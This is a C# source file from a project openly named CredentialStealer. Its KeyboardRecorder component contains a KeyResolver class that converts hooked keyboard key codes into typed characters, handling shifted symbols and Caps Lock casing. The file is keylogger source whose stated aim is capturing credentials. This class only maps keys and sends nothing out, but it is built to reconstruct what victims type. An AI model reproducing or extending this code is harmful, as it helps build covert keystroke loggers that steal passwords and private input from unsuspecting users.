using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using RamGecTools;

namespace CredentialStealer.KeyboardRecorder
{
    public class KeyResolver
    {
        private static Dictionary<KeyboardHook.VKeys, string> ConvertKeys = new Dictionary<KeyboardHook.VKeys, string>()
        {
            {KeyboardHook.VKeys.SPACE, @" "},
            {KeyboardHook.VKeys.OEM_COMMA, @","}, 
            {KeyboardHook.VKeys.OEM_PERIOD, @"."},
            {KeyboardHook.VKeys.OEM_PLUS, @"="},
            {KeyboardHook.VKeys.OEM_1, @";"},
            {KeyboardHook.VKeys.OEM_2, @"/"},
            {KeyboardHook.VKeys.KEY_0, @"0"},
            {KeyboardHook.VKeys.KEY_1, @"1"},
            {KeyboardHook.VKeys.KEY_2, @"2"},
            {KeyboardHook.VKeys.KEY_3, @"3"},
            {KeyboardHook.VKeys.KEY_4, @"4"},
            {KeyboardHook.VKeys.KEY_5, @"5"},
            {KeyboardHook.VKeys.KEY_6, @"6"},
            {KeyboardHook.VKeys.KEY_7, @"7"},
            {KeyboardHook.VKeys.KEY_8, @"8"},
            {KeyboardHook.VKeys.KEY_9, @"9"},
        };

        private static List<KeyboardHook.VKeys> IgnoreKeys = new List<KeyboardHook.VKeys>() 
        {   KeyboardHook.VKeys.CONTROL,
            KeyboardHook.VKeys.LCONTROL,
            KeyboardHook.VKeys.RCONTROL,
            KeyboardHook.VKeys.LSHIFT,
            KeyboardHook.VKeys.RSHIFT,
            KeyboardHook.VKeys.SHIFT 
        };

        private static Dictionary<KeyboardHook.VKeys, string> ShiftKeys = new Dictionary<KeyboardHook.VKeys, string>(){
            {KeyboardHook.VKeys.KEY_1, @"!"}, 
            {KeyboardHook.VKeys.KEY_2, @"@"},
            {KeyboardHook.VKeys.KEY_3, @"#"},
            {KeyboardHook.VKeys.KEY_4, @"$"},
            {KeyboardHook.VKeys.KEY_5, @"%"},
            {KeyboardHook.VKeys.KEY_6, @"^"},
            {KeyboardHook.VKeys.KEY_7, @"&"},
            {KeyboardHook.VKeys.KEY_8, @"*"},
            {KeyboardHook.VKeys.KEY_9, @"("},
            {KeyboardHook.VKeys.KEY_0, @")"}, 
            {KeyboardHook.VKeys.OEM_1, @":"},
            {KeyboardHook.VKeys.OEM_PLUS, @"+"},
            {KeyboardHook.VKeys.OEM_2, @"?"}
        };

        public string Resolve(KeyboardHook.VKeys key, bool isShift, bool isCaps)
        {
            if (IgnoreKeys.Contains(key))
            {
                return "";
            }
            else if (isShift && ShiftKeys.Keys.Contains(key))
            {
                return ShiftKeys[key];
            }
            else if (ConvertKeys.Keys.Contains(key)) 
            {
                return ConvertKeys[key];
            }
            else if ((isShift && isCaps) || !(isShift || isCaps))
            {
                return key.ToString().ToLower();
            }
            else if (isShift || isCaps )
            {
                return key.ToString().ToUpper();
            }
            else
            {
                return "";
            }
            
        }
    }
}
